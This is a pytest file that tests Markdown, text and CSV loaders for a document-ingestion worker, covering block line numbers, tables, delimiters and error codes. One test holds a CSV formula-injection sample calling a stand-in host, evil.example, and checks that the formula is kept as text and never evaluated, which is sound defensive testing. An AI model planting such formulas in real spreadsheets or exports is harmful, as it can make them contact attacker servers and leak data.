"""E4.5 loaders for Markdown, text and CSV: blocks with provenance, tables, failure codes."""

import uuid

import pytest
from fixtures import fixture_path
from sbam_contracts.api import ErrorCode
from sbam_contracts.documents import Block, ParsedDocument
from sbam_workers.ingest.loaders import (
    LOADERS,
    Parsed,
    ParseError,
    loader_for,
    no_heartbeat,
)


def docs(name: str) -> bytes:
    return fixture_path("documents", name).read_bytes()


def run(kind: str, data: bytes) -> Parsed:
    loader = loader_for(kind)
    assert loader is not None
    return loader(data, no_heartbeat)


def refused(kind: str, data: bytes) -> ErrorCode:
    with pytest.raises(ParseError) as caught:
        run(kind, data)
    return caught.value.code


def blocks_of(parsed: Parsed) -> list[Block]:
    return list(parsed.blocks)


def markdown_of(parsed: Parsed) -> str:
    assert isinstance(parsed.markdown, str)
    return parsed.markdown


def valid(parsed: Parsed) -> ParsedDocument:
    """What the activity writes as doc.json: it must validate."""
    return ParsedDocument(
        document_version_id=uuid.uuid4(), loader="x", blocks=blocks_of(parsed), tables=parsed.tables
    )


# --- the registry ---------------------------------------------------------------------------------


def test_e4_5_the_registry_has_the_six_mvp_document_loaders_and_nothing_else_yet() -> None:
    assert set(LOADERS) == {"md", "txt", "csv", "pdf", "docx", "xlsx", "png", "jpg", "jpeg", "tiff"}
    for pending in ("eml", "msg", "json", "yaml", "py", "zip", "tar.gz", "bmp", "gif", None, ""):
        assert loader_for(pending) is None  # e-mail, structured, code, archives: later issues


# --- Markdown -------------------------------------------------------------------------------------


def test_e4_5_markdown_headings_items_and_paragraphs_keep_their_lines() -> None:
    parsed = run("md", docs("sample.md"))
    valid(parsed)
    by_type = [(b.type.value, b.level, b.line, b.text) for b in parsed.blocks]
    assert by_type[0] == ("heading", 1, 1, "NAV-9 RFQ summary")
    assert ("heading", 2, 5, "Scope") in by_type
    assert ("list_item", None, 7, "2,500 units of the NAV-9 flight controller board") in by_type
    assert ("list_item", None, 12, "U-210 is single-source.") in by_type
    assert ("paragraph", None, 3, "**Customer:** Alpha Dynamics Ltd (synthetic)") in by_type
    assert parsed.tables == [] and parsed.report.tables == 0


def test_e4_5_markdown_output_is_the_text_with_normal_line_ends() -> None:
    parsed = run("md", b"\xef\xbb\xbf# Title\r\n\r\nText\r\n")
    assert parsed.markdown == "# Title\n\nText\n"


def test_e4_5_a_fenced_code_block_is_one_paragraph_and_hides_its_hashes() -> None:
    parsed = run("md", b"# A\n\n```\n# not a heading\n- not an item\n```\n\nafter\n")
    kinds = [(b.type.value, b.line) for b in parsed.blocks]
    assert kinds == [("heading", 1), ("paragraph", 3), ("paragraph", 8)]
    assert "# not a heading" in blocks_of(parsed)[1].text


def test_e4_5_an_unclosed_fence_runs_to_the_end_without_losing_text() -> None:
    [block] = blocks_of(run("md", b"```\ncode\nmore\n"))
    assert (block.line, block.text) == (1, "```\ncode\nmore\n")


@pytest.mark.parametrize(
    ("line", "kind", "text"),
    [
        ("- one", "list_item", "one"),
        ("* two", "list_item", "two"),
        ("+ three", "list_item", "three"),
        ("12. twelve", "list_item", "twelve"),
        ("3) three", "list_item", "three"),
        ("## Closed ##", "heading", "Closed"),
        ("####### seven", "paragraph", "####### seven"),
        ("#nospace", "paragraph", "#nospace"),
        ("-nospace", "paragraph", "-nospace"),
    ],
)
def test_e4_5_markdown_line_kinds(line: str, kind: str, text: str) -> None:
    [block] = run("md", f"{line}\n".encode()).blocks
    assert (block.type.value, block.text, block.line) == (kind, text, 1)


# --- plain text -----------------------------------------------------------------------------------


def test_e4_5_plain_text_is_paragraphs_separated_by_blank_lines() -> None:
    parsed = run("txt", docs("sample.txt"))
    valid(parsed)
    assert all(b.type.value == "paragraph" for b in parsed.blocks)
    assert blocks_of(parsed)[0].line == 1
    assert markdown_of(parsed).count("\n\n") == len(blocks_of(parsed)) - 1


def test_e4_5_plain_text_does_not_read_markdown_into_the_text() -> None:
    [block] = run("txt", b"# not a heading\n- not an item\n").blocks
    assert block.type.value == "paragraph" and block.text == "# not a heading\n- not an item"


# --- text failures --------------------------------------------------------------------------------


@pytest.mark.parametrize("kind", ["md", "txt", "csv"])
@pytest.mark.parametrize(
    "data", [b"", b"   \n\n\t\n", b"\xef\xbb\xbf\n"], ids=["empty", "blank", "bom"]
)
def test_e4_5_a_file_with_no_content_is_empty(kind: str, data: bytes) -> None:
    assert refused(kind, data) is ErrorCode.EMPTY


@pytest.mark.parametrize("kind", ["md", "txt", "csv"])
def test_e4_5_bad_utf8_or_a_nul_byte_after_the_first_8kb_is_corrupt(kind: str) -> None:
    head = (b"line of text\n" * 1000)[:9000]
    assert refused(kind, head + b"\xff\xfe broken") is ErrorCode.CORRUPT
    assert refused(kind, head + b"a\x00b") is ErrorCode.CORRUPT


# --- CSV ------------------------------------------------------------------------------------------


def test_e4_5_t03_a_semicolon_csv_with_a_bom_is_a_table_with_the_right_columns() -> None:
    data = "﻿MPN;Qty;Preis\nSTM32;12;1,50\nRC0603;85;0,01\n".encode()
    parsed = run("csv", data)
    valid(parsed)
    [table] = parsed.tables
    assert table.header == ["MPN", "Qty", "Preis"]  # the BOM is not part of the first name
    assert table.rows == [["STM32", "12", "1,50"], ["RC0603", "85", "0,01"]]
    assert table.start_line == 1
    rows = [b for b in parsed.blocks if b.type.value == "row"]
    assert [(b.line, b.text) for b in rows] == [
        (1, "MPN | Qty | Preis"),
        (2, "STM32 | 12 | 1,50"),
        (3, "RC0603 | 85 | 0,01"),
    ]
    assert parsed.report.tables == 1 and parsed.report.warnings == []


def test_e4_5_the_fixture_csv_has_four_columns_and_five_rows() -> None:
    [table] = run("csv", docs("sample.csv")).tables
    assert table.header == ["CPN", "MPN", "Qty", "Supplier"]
    assert len(table.rows) == 5 and table.rows[1] == ["U-210", "STM32H743VIT6", "1", "Mouser"]


@pytest.mark.parametrize(
    "delimiter", [",", ";", "\t", "|"], ids=["comma", "semicolon", "tab", "pipe"]
)
def test_e4_5_the_delimiter_is_sniffed(delimiter: str) -> None:
    text = delimiter.join(["a", "b", "c"]) + "\n" + delimiter.join(["1", "2", "3"]) + "\n"
    [table] = run("csv", text.encode()).tables
    assert table.header == ["a", "b", "c"] and table.rows == [["1", "2", "3"]]


def test_e4_5_a_quoted_value_may_span_lines_and_the_next_row_keeps_its_own_line() -> None:
    parsed = run("csv", b'name,note\n"Ann","two\nlines"\nBob,fine\n')
    [table] = parsed.tables
    assert table.rows == [["Ann", "two\nlines"], ["Bob", "fine"]]
    assert [b.line for b in parsed.blocks if b.type.value == "row"] == [1, 2, 4]


def test_e4_5_blank_lines_are_not_rows_and_do_not_shift_the_lines() -> None:
    parsed = run("csv", b"a,b\n\n1,2\n\n\n3,4\n")
    assert [b.line for b in parsed.blocks if b.type.value == "row"] == [1, 3, 6]


def test_e4_5_ragged_rows_are_padded_noted_and_not_dropped() -> None:
    parsed = run("csv", b"a,b,c\n1,2\n1,2,3,4\n5,6,7\n")
    [table] = parsed.tables
    assert table.rows == [["1", "2", ""], ["1", "2", "3", "4"], ["5", "6", "7"]]
    assert parsed.report.warnings == [
        "line 2 has 2 fields, the header has 3",
        "line 3 has 4 fields, the header has 3",
    ]


def test_e4_5_a_very_ragged_file_gets_a_count_not_a_page_of_warnings() -> None:
    body = "a,b\n" + "1\n" * 200
    warnings = run("csv", body.encode()).report.warnings
    assert len(warnings) == 21 and warnings[-1] == "180 more rows have a different number of fields"


def test_e4_5_a_header_only_file_is_a_table_with_no_rows_not_empty() -> None:
    parsed = run("csv", b"a,b,c\n")
    assert parsed.tables[0].header == ["a", "b", "c"] and parsed.tables[0].rows == []


def test_e4_5_t07_a_formula_stays_text_and_is_never_evaluated() -> None:
    [table] = run("csv", b'q,r\n"=WEBSERVICE(""http://evil.example/x"")",1\n').tables
    assert table.rows[0][0] == '=WEBSERVICE("http://evil.example/x")'


def test_e4_5_the_csv_markdown_is_a_table_with_escaped_pipes() -> None:
    md = run("csv", b'a,b\n"x|y",2\n').markdown
    assert md == "| a | b |\n| --- | --- |\n| x\\|y | 2 |\n"


def test_e4_5_a_value_larger_than_the_csv_limit_is_corrupt_not_a_crash() -> None:
    assert refused("csv", b"a,b\n" + b"x" * 200_000 + b",1\n") is ErrorCode.CORRUPT


def test_e4_5_the_loaders_beat_their_heart_on_a_long_file() -> None:
    beats: list[int] = []
    rows = "a,b\n" + "1,2\n" * 5000
    loader = loader_for("csv")
    assert loader is not None
    loader(rows.encode(), lambda: beats.append(1))
    assert len(beats) >= 4
    lines = "\n".join(f"line {n}" for n in range(3000))
    beats.clear()
    text_loader = loader_for("txt")
    assert text_loader is not None
    text_loader(lines.encode(), lambda: beats.append(1))
    assert len(beats) >= 2
